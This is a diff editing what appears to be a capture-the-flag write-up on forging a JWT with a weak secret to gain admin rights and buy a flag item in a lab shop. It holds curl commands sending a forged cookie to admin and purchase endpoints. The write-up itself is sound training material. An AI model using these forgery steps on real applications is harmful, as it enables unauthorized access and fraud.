@@ -58,24 +58,34 @@ Modified payload (role → "admin", credits → 9999):JSON{
 
 run with python3 file.py
 
-Encoded new token (secret cracked via weak guess – e.g. "secret"):texteyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluaXN0cmF0b3JAZ21haWwuY29tIiwicm9sZSI6ImFkbWluIiwiY3JlZGl0cyI6OTk5OSwiaWF0IjoxNzcxNDA0MzI3LCJ0aGVtZSI6InZhbGVudGluZSJ9.9yUWHvUfd9G4z930GRhOmZG8OOpN2VvVSWMoP0w3UiQ
+Encoded new token (secret cracked via weak guess – e.g. "secret"): {resulting NEW_TOKEN}
 Set cookie & access /admin:Bashcurl -v -H "Cookie: tryheartme_jwt=[NEW_TOKEN]" http://target:5000/adminResponse: 200 OK – Admin Portal loaded
 "Staff session detected. Staff can purchase the ValenFlag item."
 Link: /product/valenflag
+<img width="923" height="261" alt="image" src="https://github.com/user-attachments/assets/d9a946b4-fca7-495a-8181-f268cc206af9" />
 
-Access ValenFlag product:Bashcurl -v -H "Cookie: tryheartme_jwt=[NEW_TOKEN]" http://target:5000/product/valenflag
+Access ValenFlag product:
+curl -v -H "Cookie: tryheartme_jwt=[NEW_TOKEN]" http://target:5000/product/valenflag
 Price: 777 credits (covered by 9999)
 Buy form: POST /buy/valenflag
+
+<img width="852" height="263" alt="image" src="https://github.com/user-attachments/assets/2e1bb469-ddd3-46f8-b620-419308dd431d" />
+
 
 Purchase ValenFlag:Bashcurl -v -H "Cookie: tryheartme_jwt=[NEW_TOKEN]" -X POST http://target:5000/buy/valenflagResponse: 302 → /receipt/valenflag
 Voucher receipt page prints the flag
 
+<img width="798" height="213" alt="image" src="https://github.com/user-attachments/assets/d762f7f1-0bd5-4001-97c4-87381029662b" />
+
 
 Flag:
 THM{...} (exact string from receipt page – paste it when you grab it)
+
+<img width="792" height="249" alt="image" src="https://github.com/user-attachments/assets/3407a706-b777-43ca-99d8-20037c248538" />
+
 5. Tools & Commands Used
 
-curl (testing, cookie manipulation)
+ burpsuite , curl (testing, cookie manipulation)
 ffuf (dir enum)
 jwt.io / pyjwt (JWT decode/modify)
 Browser DevTools (cookie edit)
